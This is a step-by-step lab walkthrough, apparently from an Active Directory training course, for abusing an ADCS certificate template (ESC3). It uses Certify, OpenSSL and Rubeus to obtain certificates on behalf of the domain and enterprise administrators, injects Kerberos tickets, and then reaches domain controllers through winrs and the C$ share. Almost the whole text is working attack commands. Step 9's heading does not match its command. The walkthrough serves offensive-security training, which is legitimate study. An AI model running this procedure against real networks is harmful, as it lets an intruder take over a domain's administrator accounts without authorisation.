#### 1. List Vulnerable Templates
```
C:\AD\Tools>C:\AD\Tools\Certify.exe find /vulnerable

The "SmartCardEnrollment-Agent" template has EKU for Certificate Request Agent and grants enrollment rights to Domain users.
```

#### 2. Find Another Template that Has an EKU That Allows for Domain Authentication and Application Policy Requirement of Certificate Request Agent
```markdown
C:\AD\Tools>C:\AD\Tools\Certify.exe find
```

#### 3. Request an Enrollment Agent Certificate from the Template - SmartCardEnrollment-Agent
```markdown
C:\AD\Tools>C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```

#### 4. Save the Certificate and Convert
```markdown
Save the certificate text to esc3.pem and convert to PFX. Use SecretPass@123 as the export password.

C:\AD\Tools>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
```

#### 5. Request a Certificate for DA
```markdown
C:\AD\Tools>C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```

#### 6. Save and Convert
```markdown
Save the certificate text to esc3-DA.pem and convert the PEM to PFX. Use SecretPass@123 as the export password.

C:\AD\Tools>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
```

#### 7. Request a TGT for DA
```markdown
C:\AD\Tools> C:\AD\Tools\Rubeus.exe asktgt /user:administrator /certificate:esc3-DA.pfx /password:SecretPass@123 /ptt

Check

C:\AD\Tools>winrs -r:dcorp-dc whoami

masky -d <domain> -u <user> (-p <password> || -k || -H <hash>) -ca <certificate authority> <ip>
```

#### 8. Escalate to Enterprise Admin
```markdown
We just need to make changes to request to the SmartCardEnrollment-Users template and Rubeus. Please note that we are using '/onbehalfof: mcorp\administrator' here:

C:\AD\Tools>C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof: mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```

#### 9. Convert the PEM to esc3-EApfx Using OpenSSL
```markdown
C:\AD\Tools> C:\AD\Tools\ Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:esc3-EA.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
```

#### 10. Access
```markdown
net view \\dcne

net use * \\domain\c$
```
